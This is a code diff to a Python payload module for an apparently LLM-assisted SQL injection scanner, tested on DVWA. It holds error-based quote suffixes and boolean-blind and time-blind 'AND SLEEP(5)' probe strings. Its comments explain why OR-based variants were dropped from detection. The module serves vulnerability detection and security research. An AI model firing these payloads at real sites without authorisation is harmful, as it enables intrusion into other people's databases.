@@ -23,32 +23,37 @@ Technique = Literal["error-based", "boolean-blind", "time-blind"]
 class Payload:
     value: str
     technique: Technique
-    context: Context
+    context: str          # "any" for suffixes that fit every context
     note: str = ""
 
 
 # ---------------------------------------------------------------------------
 # 1. error-based -- pull out DB error messages. Cheapest and fastest, so always first.
 # ---------------------------------------------------------------------------
+# EVERY payload here is a SUFFIX. The prober appends it to the parameter's
+# original value, so id=1 is sent as id=1' -- it never replaces the value.
+# That is why there is no "1'" entry: appending it to 1 would send id=11'.
 ERROR_BASED = [
-    Payload("'",      "error-based", "string",  "break syntax with a single quote"),
-    Payload('"',      "error-based", "string",  "double-quote context"),
-    Payload("')",     "error-based", "string",  "wrapped in parentheses"),
-    Payload("\\",     "error-based", "string",  "break backslash escaping"),
-    Payload("1'",     "error-based", "numeric", "quote after a number"),
+    Payload("'",      "error-based", "any",  "break syntax with a single quote"),
+    Payload('"',      "error-based", "any",  "double-quote context"),
+    Payload("')",     "error-based", "any",  "wrapped in parentheses"),
+    Payload("\\",     "error-based", "any",  "break backslash escaping"),
 ]
 
 # ---------------------------------------------------------------------------
 # 2. boolean-blind -- send a true/false pair and look at the response difference.
 #    IMPORTANT: always send them as a pair. A single request cannot decide anything.
 # ---------------------------------------------------------------------------
+#    IMPORTANT: AND only, never OR. The decision rule is an asymmetry -- TRUE has
+#    to match the baseline while FALSE differs. An OR-TRUE payload returns every
+#    row in the table, so it differs from the baseline too, and a genuinely
+#    vulnerable parameter gets scored "not vulnerable". OR belongs to
+#    exploitation, not to detection.
 BOOLEAN_BLIND_STRING = [
     ("' AND '1'='1",        "' AND '1'='2"),
-    ("' OR '1'='1'-- ",     "' OR '1'='2'-- "),
 ]
 BOOLEAN_BLIND_NUMERIC = [
     (" AND 1=1",            " AND 1=2"),
-    (" OR 1=1-- ",          " OR 1=2-- "),
 ]
 
 # ---------------------------------------------------------------------------
@@ -56,9 +61,11 @@ BOOLEAN_BLIND_NUMERIC = [
 #    IMPORTANT: always confirm with 2 reproductions. One delay is not evidence.
 # ---------------------------------------------------------------------------
 SLEEP_SECONDS = 5
+# AND only, again. "OR SLEEP(5)" evaluates SLEEP once per row the query returns,
+# so a five-row table answers after 25 seconds, not 5 -- which reads as a hang,
+# blows the request timeout, and holds a DB connection the whole time.
 TIME_BLIND_STRING = [
     Payload(f"' AND SLEEP({SLEEP_SECONDS})-- ",       "time-blind", "string"),
-    Payload(f"' OR SLEEP({SLEEP_SECONDS})-- ",        "time-blind", "string"),
 ]
 TIME_BLIND_NUMERIC = [
     Payload(f" AND SLEEP({SLEEP_SECONDS})-- ",        "time-blind", "numeric"),
@@ -93,17 +100,31 @@ def select(context: Context, stage: int) -> list:
       Because the LLM does not pick the list itself, reproducibility across runs is guaranteed.
     """
     if stage == 1:
-        if context == "numeric":
-            return [p for p in ERROR_BASED if p.context in ("numeric", "string")]
-        return [p for p in ERROR_BASED if p.context == "string"]
+        # Every error-based payload is a context-free suffix, so the whole group
+        # goes out regardless of what the LLM judged.
+        return list(ERROR_BASED)
 
     if stage == 2:
-        return BOOLEAN_BLIND_NUMERIC if context == "numeric" else BOOLEAN_BLIND_STRING
+        return _ordered(BOOLEAN_BLIND_NUMERIC, BOOLEAN_BLIND_STRING, context)
 
     if stage == 3:
-        return TIME_BLIND_NUMERIC if context == "numeric" else TIME_BLIND_STRING
+        return _ordered(TIME_BLIND_NUMERIC, TIME_BLIND_STRING, context)
 
     return []
+
+
+def _ordered(numeric: list, string: list, context: Context) -> list:
+    """Judged context decides the ORDER, never the membership.
+
+    A numeric-looking value is not proof of a numeric context: DVWA at level low
+    builds "WHERE user_id = '$id'", quoting a parameter whose value is 1. Betting
+    the whole stage on the LLM's guess loses the blind SQLi page. So both groups
+    always go out, with the judged one first -- the likely hit lands early and
+    the run still stops at the first confirmation.
+
+    Deterministic either way: the same context always produces the same sequence.
+    """
+    return (numeric + string) if context == "numeric" else (string + numeric)
 
 
 def has_sql_error(body: str) -> str | None:
@@ -115,9 +136,11 @@ def has_sql_error(body: str) -> str | None:
 
 
 # Total count -- used in the talk when saying "SQLmap fires thousands vs our N"
+# Requests, not entries: a boolean-blind pair costs two requests, and each
+# time-blind payload is re-sent once to confirm reproduction.
 TOTAL = (len(ERROR_BASED)
-         + len(BOOLEAN_BLIND_STRING) * 2 + len(BOOLEAN_BLIND_NUMERIC) * 2
-         + len(TIME_BLIND_STRING) + len(TIME_BLIND_NUMERIC))
+         + (len(BOOLEAN_BLIND_STRING) + len(BOOLEAN_BLIND_NUMERIC)) * 2
+         + (len(TIME_BLIND_STRING) + len(TIME_BLIND_NUMERIC)) * 2)
 
 if __name__ == "__main__":
     print(f"{TOTAL} payloads total (SQLmap fires thousands indiscriminately)")
